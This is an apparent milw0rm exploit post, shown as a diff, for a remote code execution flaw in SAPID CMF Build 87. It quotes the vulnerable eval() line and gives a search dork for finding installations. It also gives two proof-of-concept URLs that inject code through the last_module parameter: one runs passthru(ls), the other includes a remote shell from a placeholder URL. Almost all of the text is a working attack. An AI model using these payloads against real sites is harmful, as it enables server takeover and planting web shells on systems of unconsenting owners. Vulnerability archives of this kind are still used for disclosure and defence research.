@@ -1,0 +1,15 @@
+### SAPID CMF Build 87 (last_module) Remote Code Execution Vulnerability
+### Script R84 : http://puzzle.dl.sourceforge.net/sourceforge/sapidcmf/sapidcmf.r84.zip
+### Script Update R87 :http://surfnet.dl.sourceforge.net/sourceforge/sapidcmf/sapidcmf.update.r84-r87.zip
+### Dork : Powered by SAPID CMF Build 87
+### Vuln :
+### 09:  */
+
+eval('class perfmon_parent_EXTENDER extends ' . $last_module . '_ADOConnection { }');
+### POC :
+###     /vendors/adodb_lite/adodb-perf-module.inc.php?last_module=t{};%20class%20t{};passthru(ls);//
+###     OR INCLUDE SHELL
+###     /vendors/adodb_lite/adodb-perf-module.inc.php?last_module=t{};%20class%20t{};include(URL-SHELL);//
+###  I'm TrYaGi ......:)
+
+# milw0rm.com [2008-02-10]
